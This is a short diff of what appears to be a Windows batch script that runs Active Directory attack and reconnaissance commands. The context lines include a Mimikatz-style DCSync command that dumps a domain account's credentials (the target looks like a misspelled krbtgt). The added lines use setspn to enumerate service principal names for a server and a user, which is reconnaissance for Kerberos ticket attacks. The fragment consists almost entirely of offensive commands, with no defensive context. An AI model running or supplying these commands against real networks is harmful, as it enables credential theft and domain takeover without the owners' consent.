@@ -523,6 +523,10 @@ netsh winhttp reset proxy
 ECHO ============================
 lsadump:dcsync /domain:abc.local /user:ktbtgt
 ECHO ============================
+setspn -L servertest
+ECHO ============================
+setspn -L abc.local\johnwick
+ECHO ============================
 dir /b /ad "C:\Users\"
 ECHO ============================
 ECHO ***************************************************
